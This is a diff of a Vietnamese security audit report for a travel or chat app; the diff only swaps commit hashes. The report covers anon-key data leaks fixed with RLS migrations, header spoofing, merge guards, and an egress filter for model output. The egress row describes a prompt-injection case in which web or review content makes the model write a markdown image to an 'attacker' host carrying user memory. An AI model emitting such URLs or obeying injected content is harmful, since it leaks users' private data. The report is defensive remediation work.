@@ -13,9 +13,9 @@ Chưa deploy, chưa push. Không kết nối DB production. Mọi thay đổi DB
 
 | # | Việc | Kết quả |
 |---|---|---|
-| 1 | **F-065, P0**: `groups` / `group_members` đọc được bằng anon key | ✅ **Đã sửa** (`be3beba`) và đo live trên audit. Trước khi sửa: anon key đọc được 2/2 nhóm và 2/2 dòng thành viên, gồm cả `dietary_restrictions`. Sau khi sửa: 0/0. Test DB 11/11; khi bỏ migration thì 5 test fail |
+| 1 | **F-065, P0**: `groups` / `group_members` đọc được bằng anon key | ✅ **Đã sửa** (`8cc6caa`) và đo live trên audit. Trước khi sửa: anon key đọc được 2/2 nhóm và 2/2 dòng thành viên, gồm cả `dietary_restrictions`. Sau khi sửa: 0/0. Test DB 11/11; khi bỏ migration thì 5 test fail |
 | 2 | 7 commit bảo mật 09-03 chưa từng lên nhánh ship | 5 commit đã khôi phục, 1 được khoá lại bằng test, **1 cố ý không đưa lại** (có lý do). Guard SQL G5/G6 cũng được khôi phục, và G5 lập tức bắt thêm 1 policy `USING (true)` (false positive, đã ghi lý do) |
-| 3 | Audit mất-code cho **14 merge** trong tháng | Tìm thêm 1 lỗ **P1 quyền riêng tư**: `review_likes` đọc được bằng anon key. Đã sửa (`84e8669`). **1 P1 cần owner quyết** (F-086). 5 mục P2, còn lại P3 hoặc cố ý |
+| 3 | Audit mất-code cho **14 merge** trong tháng | Tìm thêm 1 lỗ **P1 quyền riêng tư**: `review_likes` đọc được bằng anon key. Đã sửa (`f5f0458`). **1 P1 cần owner quyết** (F-086). 5 mục P2, còn lại P3 hoặc cố ý |
 | 4 | Phòng ngừa | Đề xuất một check chạy **trước khi merge vào nhánh ship** (§4). Chưa làm, chờ bạn duyệt |
 
 **Vấn đề hệ thống:** code bị mất theo **ba** cách, không chỉ một:
@@ -63,18 +63,18 @@ Route join trên dev server :3007 trả 500 do dev server hỏng (xem phần "C�
 
 | Commit | Bảo vệ cái gì | rc có bảo vệ bằng cách khác không? | Khai thác được hôm nay? | Hành động |
 |---|---|---|---|---|
-| `558ba49` | Nhóm / thành viên nhóm chỉ người tham gia được đọc | **Không**: policy `USING (true)` trên rc và cả prod (snapshot 09-17) | **Có**: chỉ cần anon key public, đo được live | ✅ `be3beba` (§1) |
-| `66e4c46` + phần ảnh của `a711181` (P3-F2/F4/F5) | Model chỉ được xuất URL mà nó **được giao** (có trong kết quả tool của lượt này hoặc trong câu trả lời đã phát hành). Ảnh không thuộc hệ thống → alt text. Đích của CTA/plan bị giới hạn | **Không**. rc `validateModelCtaBlock` chặn nút *mạo danh merchant*, nhưng host lạ thì không; comment trong code tự thừa nhận "no other rule here drops them" | **Có, cần prompt injection**: kết quả web/review/caption khiến model viết `![x](https://attacker/…?d=<memory>)`. Web render thành `<img>` (CSP `img-src https:`), Android render gallery → **không cần click** | ✅ `129f6c9`, port vào pipeline hiện tại (chi tiết dưới) |
-| `a711181` (P3-F3) | Caption/title của Explore được fence, giới hạn độ dài; category lấy từ tập đóng | **Không**: `contentProcessor.ts` trên rc giống hệt bản trước khi sửa | **Có**: prompt injection vào bộ phân loại + khuếch đại chi phí (caption vài MB × 20 lần/phút) | ✅ `61fe4a9` |
-| `a711181` (P3-F1) + `a3c342a` (S-2) | IP người gọi lấy từ header nền tảng, không lấy hop do caller tự viết; giới hạn oracle "email này có tài khoản không" | Vercel tự ghi đè `x-forwarded-for` "to prevent IP spoofing" (vercel.com/docs/headers/request-headers) | **Thấp** trên Vercel. Còn giá trị phòng thủ nhiều lớp + chặn giá trị không hợp lệ vào cột INET | ✅ `932ac2c`. Rule kiến trúc được khôi phục và bắt thêm một chỗ đọc XFF tự chế (trang subscription) |
-| `fc115b7` (C-1) | Ngắt kết nối Google Calendar → **thu hồi token tại Google** | **Không**: rc chỉ xoá dòng của mình | Nhỏ: UI Connections đang ẩn; chỉ ảnh hưởng tài khoản đã kết nối trước đó | ✅ `b4a427b` |
-| `44d8f32` | Khoá bất biến: khối prompt dựng từ hội thoại mà **không fence** chỉ được in giá trị thuộc bảng đóng | `renderNeedBrief` không có trên rc. Vai trò tương đương là `buildDecisionFrameBlock`: an toàn nhờ thiết kế nhưng **không có test khoá** | Chưa: hiện an toàn; rủi ro là hồi quy âm thầm về sau | ✅ `eea5c12`: test mới đã kiểm bằng đột biến (nới regex quận → 2 fail) |
+| `558ba49` | Nhóm / thành viên nhóm chỉ người tham gia được đọc | **Không**: policy `USING (true)` trên rc và cả prod (snapshot 09-17) | **Có**: chỉ cần anon key public, đo được live | ✅ `8cc6caa` (§1) |
+| `66e4c46` + phần ảnh của `a711181` (P3-F2/F4/F5) | Model chỉ được xuất URL mà nó **được giao** (có trong kết quả tool của lượt này hoặc trong câu trả lời đã phát hành). Ảnh không thuộc hệ thống → alt text. Đích của CTA/plan bị giới hạn | **Không**. rc `validateModelCtaBlock` chặn nút *mạo danh merchant*, nhưng host lạ thì không; comment trong code tự thừa nhận "no other rule here drops them" | **Có, cần prompt injection**: kết quả web/review/caption khiến model viết `![x](https://attacker/…?d=<memory>)`. Web render thành `<img>` (CSP `img-src https:`), Android render gallery → **không cần click** | ✅ `0ea9db3`, port vào pipeline hiện tại (chi tiết dưới) |
+| `a711181` (P3-F3) | Caption/title của Explore được fence, giới hạn độ dài; category lấy từ tập đóng | **Không**: `contentProcessor.ts` trên rc giống hệt bản trước khi sửa | **Có**: prompt injection vào bộ phân loại + khuếch đại chi phí (caption vài MB × 20 lần/phút) | ✅ `994130f` |
+| `a711181` (P3-F1) + `a3c342a` (S-2) | IP người gọi lấy từ header nền tảng, không lấy hop do caller tự viết; giới hạn oracle "email này có tài khoản không" | Vercel tự ghi đè `x-forwarded-for` "to prevent IP spoofing" (vercel.com/docs/headers/request-headers) | **Thấp** trên Vercel. Còn giá trị phòng thủ nhiều lớp + chặn giá trị không hợp lệ vào cột INET | ✅ `8d5bf8e`. Rule kiến trúc được khôi phục và bắt thêm một chỗ đọc XFF tự chế (trang subscription) |
+| `fc115b7` (C-1) | Ngắt kết nối Google Calendar → **thu hồi token tại Google** | **Không**: rc chỉ xoá dòng của mình | Nhỏ: UI Connections đang ẩn; chỉ ảnh hưởng tài khoản đã kết nối trước đó | ✅ `6b8bff4` |
+| `44d8f32` | Khoá bất biến: khối prompt dựng từ hội thoại mà **không fence** chỉ được in giá trị thuộc bảng đóng | `renderNeedBrief` không có trên rc. Vai trò tương đương là `buildDecisionFrameBlock`: an toàn nhờ thiết kế nhưng **không có test khoá** | Chưa: hiện an toàn; rủi ro là hồi quy âm thầm về sau | ✅ `fd808d8`: test mới đã kiểm bằng đột biến (nới regex quận → 2 fail) |
 | `2caff4b` | `/api/chat` không dùng service role (least privilege) | `updateMemory` ghim `user_id` **sau** khi spread patch (memoryService.ts:89–90) | **Không**: chỉ là lớp phòng thủ thêm | ❌ **Không đưa lại** (F-085). Lý do: rc đã thêm một lệnh ghi service-role hợp lệ (`user_events`, role thường không ghi được), nên rule kiến trúc của commit này sẽ fail. Cần quyết định cách ghi `user_events` trước |
-| `a3c342a` + `fc115b7` (guard SQL G5/G6) | G5: policy `SELECT … USING (true)` trên bảng dữ liệu cá nhân. G6: migration gỡ RLS của bảng nhạy cảm | Không có trên rc | Là guard phòng ngừa | ✅ `3adc151`. Bỏ migration nhóm → G5 báo `groups` + `group_members`. G5 cũng bắt `chat_settings` (một dòng cấu hình toàn cục, anon đã bị revoke quyền) → đưa vào allowlist kèm lý do |
+| `a3c342a` + `fc115b7` (guard SQL G5/G6) | G5: policy `SELECT … USING (true)` trên bảng dữ liệu cá nhân. G6: migration gỡ RLS của bảng nhạy cảm | Không có trên rc | Là guard phòng ngừa | ✅ `72cdace`. Bỏ migration nhóm → G5 báo `groups` + `group_members`. G5 cũng bắt `chat_settings` (một dòng cấu hình toàn cục, anon đã bị revoke quyền) → đưa vào allowlist kèm lý do |
 
 **Không đưa lại:** các tài liệu `docs/security/V3_*.md` (chỉ mô tả nhánh 09-03, trừ `V3_THREAT_MODEL.md` đi kèm bản sửa nhóm) và các script mutation harness của nhánh cũ.
 
-### Egress (`129f6c9`): port vào đâu và vì sao khác bản gốc
+### Egress (`0ea9db3`): port vào đâu và vì sao khác bản gốc
 
 `streamEnrichment.ts` trên rc đã có hai đường mới mà bản 09-03 không có. Nếu đặt lớp chặn đúng chỗ gốc thì vẫn rò. Tôi đặt nó ở các điểm hội tụ:
 - **Luồng live:** mọi delta đi qua `emitLive` / `releasableLiveText`, chỉ giữ lại token đang dở. Lượt thường giữ nguyên byte, số frame và nhịp.
@@ -108,17 +108,17 @@ Hai test cũ của rc khẳng định một link *bịa* được giữ lại; t
    - **conflict**: người resolve chọn nửa kia → có thể hợp lệ.
 4. Kiểm dòng đó có còn trong **code sống** ở tip không (loại `docs/`, vì các bản park ở đó từng che mất lỗ `review_likes`).
 
-Kết quả: `audit-at-fb6494a/` (trước các sửa hôm nay) và `audit-at-HEAD/`.
+Kết quả: `audit-at-eccf2d2/` (trước các sửa hôm nay) và `audit-at-HEAD/`.
 
 Công cụ là heuristic theo dòng: nó **báo dư** khi code được viết lại bằng chữ khác. Vì vậy mọi dòng có ý nghĩa đều được triage thủ công, theo ba nhóm guard / Android / web, và mỗi kết luận đều kèm lệnh `git`.
 
-| Merge | Nội dung | File có mất | Dòng thiếu ở tip (fb6494a → HEAD) | Vùng clean | Kết luận |
+| Merge | Nội dung | File có mất | Dòng thiếu ở tip (eccf2d2 → HEAD) | Vùng clean | Kết luận |
 |---|---|---|---|---|---|
 | `3cbb10e` 09-24 | rc/web-uat → uat/unified | 33 | 217 → 217 | 73 | Phần lớn là cổng `SHOW_MUSIC`, R-3 được thay bằng code mới hơn. **Mất thật:** sidebar MY ACCOUNT (F-090, P2), UI ảnh nhóm (F-089, P2). `api/track` đã được c7604c9 sửa lại |
 | `d917c44` 09-18 | G1 growth → rc | 13 | 70 → 70 | 18 | Đều cố ý (có ghi trong message): quota trọn đời, "Public link" chuyển thành một dòng trong share sheet, thêm `trip.com`. `product.ts` chỉ đổi comment |
 | `d303a91` 09-18 | phase4 design | 7 | 19 → 19 | 12 | P3: greeting chuyển file, hạn mức chuỗi cứng, artifact `docs/audit` |
-| `1e7b77e` 09-18 | cool-vaughan | 36 | **357 → 95** | 338 → 77 | **P1: `review_likes` riêng tư** bị park cùng profile-v2 → ✅ `84e8669`. **F-086 (P1, owner quyết):** khoản ngân sách thành "tổng chi phí". **F-087 (P2):** guard không khí/chất lượng. Phần còn lại là bộ profile-v2 park có chủ đích (26 file, khớp 100% bản `.txt`) |
-| `a6ca9f0` 09-18 | v3-canonical (việc chưa commit) | 19 | 414 → 414 | 301 | **P1: dây nối share Android** → ✅ `8e90514` (hôm qua). **F-088 (P2):** 6 bản sửa đồng bộ thẻ mua sắm Android bị bỏ (message nói "CCP versions kept"; phần sửa không đè lên CCP). Còn lại cố ý / thay thế |
+| `1e7b77e` 09-18 | cool-vaughan | 36 | **357 → 95** | 338 → 77 | **P1: `review_likes` riêng tư** bị park cùng profile-v2 → ✅ `f5f0458`. **F-086 (P1, owner quyết):** khoản ngân sách thành "tổng chi phí". **F-087 (P2):** guard không khí/chất lượng. Phần còn lại là bộ profile-v2 park có chủ đích (26 file, khớp 100% bản `.txt`) |
+| `a6ca9f0` 09-18 | v3-canonical (việc chưa commit) | 19 | 414 → 414 | 301 | **P1: dây nối share Android** → ✅ `2153944` (hôm qua). **F-088 (P2):** 6 bản sửa đồng bộ thẻ mua sắm Android bị bỏ (message nói "CCP versions kept"; phần sửa không đè lên CCP). Còn lại cố ý / thay thế |
 | `2dba2e3` 09-18 | integration/v3-canonical | 16 | 219 → 219 | 147 | **F-091 (P2, owner quyết):** bộ sưu tập cá nhân trên web + chuyển `?tab=profile` (message: "NOT merged", OPEN). Test Android được ghim lại có chủ đích |
 | `28e1d7d` 09-18 | affiliate cross-platform | 34 | 129 → 129 | 60 | Cố ý: đổi tên kiểu iOS, bỏ side channel `takeLatestPlacesView`. P3 |
 | `89e65f7`, `764effd` 09-17 | origin/main → V3 / CCP | 7 / 3 | 60 / 26 | 0 / 0 | Chỉ nửa conflict, đều có bản mới hơn (`parsePlan` chuyển file, `promptGender`). P3 |
@@ -129,10 +129,10 @@ Công cụ là heuristic theo dòng: nó **báo dư** khi code được viết l
 
 | Mức | Mất gì | Ở merge nào | Tình trạng |
 |---|---|---|---|
-| **P0** | Ranh giới đọc nhóm (loại a) | chưa từng merge | ✅ `be3beba` |
-| **P1** | `review_likes` public (lịch sử like của bất kỳ ai) | `1e7b77e` (loại c) | ✅ `84e8669`, đo live |
-| **P1** | Chặn egress URL/ảnh do model viết (loại a) | chưa từng merge | ✅ `129f6c9` |
-| **P1** | Dây nối share kế hoạch / địa điểm trên Android | `a6ca9f0` (loại b) | ✅ `8e90514` |
+| **P0** | Ranh giới đọc nhóm (loại a) | chưa từng merge | ✅ `8cc6caa` |
+| **P1** | `review_likes` public (lịch sử like của bất kỳ ai) | `1e7b77e` (loại c) | ✅ `f5f0458`, đo live |
+| **P1** | Chặn egress URL/ảnh do model viết (loại a) | chưa từng merge | ✅ `0ea9db3` |
+| **P1** | Dây nối share kế hoạch / địa điểm trên Android | `a6ca9f0` (loại b) | ✅ `2153944` |
 | **P1 · owner quyết** | Guard "ngân sách thành tổng chi phí" trong văn xuôi (F-086) | `1e7b77e` (cố ý: mâu thuẫn hợp đồng G2 bạn đã duyệt) | ⏸ Không tự sửa. Phải chọn một trong hai: (a) khôi phục `COST_FRAME_RE` ở **cả hai** chỗ miễn trừ và sửa lỗi xoá mất "Với" (F-092) trước; hoặc (b) chấp nhận và xoá test F/H |
 | P2 · owner quyết | Guard "không gian / chất lượng" (F-087) | `1e7b77e` | Rule 6 dòng; triage đã thử khôi phục, cả suite vẫn xanh trừ F/H |
 | P2 | Đồng bộ thẻ mua sắm Android (F-088) | `a6ca9f0` | Liệt kê; nguồn port `6829f6b` |
@@ -170,7 +170,7 @@ Nhánh ship trên CI đọc từ biến repo `SHIP_BRANCH` (mặc định `main`
 |---|---|---|
 | a6ca9f0 | `merge-guard --commit a6ca9f0` | ✖ exit 1: **R1** `android/…/chat/ChatScreen.kt`, dòng `TripPlanCard(plan, planJson = message.planJson)` bị gỡ ở vùng merge sạch (`a6ca9f0.txt`) |
 | 1e7b77e | `merge-guard --commit 1e7b77e` | ✖ exit 1: **R2 [protected]** `supabase/migrations/20260915b_review_likes_private.sql` và `supabase/tests/review_likes_private.test.ts`, "file added by parent 2 is deleted" (`1e7b77e.txt`) |
-| F-065 (`integration/v3-foundation`) | `branch-containment --ship fb6494a --now 2026-09-24` (tái hiện nhánh ship trước khi sửa) | ✖ exit 1: `558ba49` (20 ngày), `supabase/migrations/20260904_group_read_boundary.sql` "file absent on ship" (`containment-f065-at-fb6494a.txt`) |
+| F-065 (`integration/v3-foundation`) | `branch-containment --ship eccf2d2 --now 2026-09-24` (tái hiện nhánh ship trước khi sửa) | ✖ exit 1: `558ba49` (20 ngày), `supabase/migrations/20260904_group_read_boundary.sql` "file absent on ship" (`containment-f065-at-eccf2d2.txt`) |
 | F-065 sau khi sửa | cùng lệnh, `--ship HEAD` | `558ba49`, `a3c342a`, `fc115b7` **không còn bị báo** (đã về). Các mục còn lại là text đã viết lại, needBrief (N/A) và 2caff4b (hoãn), ghi trong allowlist đến 2026-10-31 |
 | Đối chứng âm | `merge-guard --commit 842379b` (PR #251) | ✓ exit 0 |
 
@@ -187,7 +187,7 @@ Nhánh ship trên CI đọc từ biến repo `SHIP_BRANCH` (mặc định `main`
 
 ## Quyết định của owner (2026-09-25), đã ghi vào findings.json
 
-- **F-086: khôi phục** → ✅ `2ce8402`, làm sau khi sửa **F-092** ✅ `e30bdc3`. Golden set: chạy lại khi :3007 hoạt động.
+- **F-086: khôi phục** → ✅ `84f3476`, làm sau khi sửa **F-092** ✅ `ac71f05`. Golden set: chạy lại khi :3007 hoạt động.
 - **F-085: hoãn tới sau launch.** Không đụng service role của `/api/chat`.
 - **F-087, F-088, F-089, F-090, F-091: hoãn tới sau launch.** Riêng migration `20260922_groups_avatar_url` vẫn là blocker khi deploy.
 
@@ -213,7 +213,7 @@ Cách vượt duy nhất: ghi rõ **trailer trong message của merge**, mỗi f
 
 ---
 
-## Health check (sau các commit hôm nay, HEAD `84e8669` + commit báo cáo này)
+## Health check (sau các commit hôm nay, HEAD `f5f0458` + commit báo cáo này)
 
 | Kiểm tra | Kết quả |
 |---|---|
